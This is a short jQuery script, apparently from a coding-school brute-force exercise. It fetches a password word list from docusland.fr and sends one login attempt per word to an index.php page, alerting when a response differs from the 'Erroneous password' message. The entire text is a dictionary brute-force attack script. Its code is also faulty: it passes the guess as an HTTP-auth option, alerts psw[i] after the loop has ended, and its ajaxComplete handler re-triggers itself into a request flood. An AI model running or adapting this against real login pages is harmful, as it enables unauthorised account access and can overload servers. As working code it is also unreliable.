var psw = {}
$.ajax({
	url: "http://docusland.fr/code-academie/js_bruteforce/data/dico.txt"
	, complete: function (result) {
		psw = result.responseText.split("\n");
		/*$("div").html(result);*/
	}
});


$(document).ajaxComplete(function () {
	for (var i = 0; i < psw.length; i++) {
		$.ajax({
			url: "http://docusland.fr/code-academie/js_bruteforce/index.php"
			, password: psw[i]
			, complete: function (answer) {
				var wrong = "<div style='color:red; font-size:18px'>Erroneous password</div>";
				if (answer.responseText != wrong) {
					alert(psw[i]);
				}
			}
		});
	}
});